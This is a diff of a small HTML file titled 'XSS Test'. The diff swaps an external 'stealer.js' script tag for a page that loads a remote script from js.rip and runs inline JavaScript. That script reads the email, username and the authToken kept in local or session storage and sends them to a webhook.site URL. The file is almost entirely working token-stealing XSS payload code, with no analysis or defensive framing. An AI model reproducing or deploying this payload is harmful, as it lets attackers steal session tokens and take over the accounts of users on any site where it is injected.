@@ -1,1 +1,21 @@
-<script src="https://ali82akbari.github.io/xss-scripts/stealer.js"></script>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS Test</title>
+    <script src="https://js.rip/xss-mohammadali"></script>
+    <script>
+      // استخراج اطلاعات از DOM و storage
+      let email = document.querySelector("#email")?.innerText || "";
+      let username = document.querySelector("#username")?.innerText || "";
+      let token = localStorage.getItem("authToken") || sessionStorage.getItem("authToken") || "";
+
+      // ارسال به Webhook
+      fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?email=" + email + "&username=" + username + "&token=" + token);
+    </script>
+  </head>
+  <body>
+    <h1>XSS Test Page</h1>
+    <p id="email">ali@example.com</p>
+    <p id="username">mohammadali</p>
+  </body>
+</html>
